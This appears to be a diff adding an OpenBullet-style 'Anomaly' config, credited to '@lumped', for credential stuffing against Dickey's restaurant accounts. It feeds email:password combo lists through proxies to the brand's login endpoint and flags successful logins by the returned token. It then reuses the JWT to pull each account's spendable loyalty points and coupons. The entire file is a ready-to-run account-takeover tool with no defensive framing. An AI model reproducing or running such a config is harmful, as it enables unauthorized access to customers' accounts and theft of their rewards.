@@ -1,0 +1,87 @@
+[SETTINGS]
+{
+  "Name": "Dickeys(@lumped)",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-06-28T19:48:18.881951+02:00",
+  "AdditionalInfo": "",
+  "Author": "@lumped",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://login.dickeys.com/loginOLO" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"inApp\":true}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Host: login.dickeys.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "User-Agent: okhttp/3.12.1" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 89" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "token" 
+  KEYCHAIN Failure OR 
+    KEY "Bad" 
+    KEY "Unauthorized" 
+
+PARSE "<SOURCE>" JSON "jwt_token" -> VAR "tok" 
+
+REQUEST POST "https://orders-api.dickeys.com/" AutoRedirect=FALSE 
+  CONTENT "{\"operationName\":null,\"variables\":{\"itemimageFilter\":{\"label\":{\"eq\":\"375x167\"}},\"unusedCouponsFilter\":[{\"usedOn\":{\"null\":true},\"validUntil\":{\"gte\":\"2022-04-06 21:47:52\"}}],\"includePersonConnection\":true},\"query\":\"query ($unusedCouponsFilter: [PersonCouponFilter], $includePersonConnection: Boolean!) {  viewer {    id    accessLevel    ...personCouponsFragment    __typename  }}fragment personCouponsFragment on Viewer {  personConnection(first: 1) @include(if: $includePersonConnection) {    edges {      node {        id        login {          id          lifetimePoints          spendablePoints          newLoyaltyLifetimePoints          __typename        }        usedCoupons: personCouponConnection(sort: {usedOn: DESC}, filter: [{usedOn: {null: false}}]) {          totalCount          edges {            node {              id              validUntil              usedOn              lineId              coupon {                id                code                description                imageURL                coupontypeId                label                __typename              }              __typename            }            __typename          }          __typename        }        availableCoupons: personCouponConnection(sort: {created: DESC}, filter: $unusedCouponsFilter) {          totalCount          edges {            node {              id              validUntil              usedOn              lineId              coupon {                id                description                imageURL                coupontypeId                code                label                couponActionConnection {                  edges {                    node {                      id                      target                      __typename                    }                    __typename                  }                  __typename                }                __typename              }              __typename            }            __typename          }          __typename        }        __typename      }      __typename    }    __typename  }  __typename}\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Host: orders-api.dickeys.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "User-Agent: okhttp/3.12.1" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 303" 
+  HEADER "accept: */*" 
+  HEADER "brandid: 1" 
+  HEADER "authorization: Bearer <tok>" 
+
+PARSE "<SOURCE>" JSON "spendablePoints" CreateEmpty=FALSE -> CAP "Points" 
+
+FUNCTION Constant "@lumped" -> VAR "Config By" 
+
